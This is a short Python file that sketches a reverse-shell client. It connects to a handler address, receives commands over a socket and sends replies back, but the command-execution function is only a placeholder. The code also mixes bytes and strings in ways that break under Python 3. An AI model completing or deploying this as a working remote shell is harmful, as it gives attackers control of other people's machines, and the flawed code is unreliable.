import socket

class Shell:
	def __init__(self, handler_ip, handler_port):
		self.handler_ip = handler_ip
		self.handler_port = handler_port
		
		self.comm_socket = socket.socket()
		
	def connect(self):
		self.comm_socket.connect((self.handler_ip, self.handler_port))
		
	def get_data(self):
		data = self.comm_socket.recv(4096)
		if not data: raise Exception("Handler disconnected")
		return data
		
	def send_data(self, data):
		self.comm_socket.sendall(data)
		
	def execute_shell_command(self, command):
		return "whatever man"
		
	def handle_command(self, data):
		command = data.split()[0]
		try:
			arguments = " ".join(data.split()[1:])
		except IndexError:
			pass
			
		if command == "test":
			return "test successful"
		else:
			return self.execute_shell_command(command+" "+arguments)
		
		
	def run(self):
		while True:
			data = self.get_data()
			output = self.handle_command(data)
			self.send_data(output)
			
shell = Shell("127.0.0.1", 80)
shell.connect()
shell.run()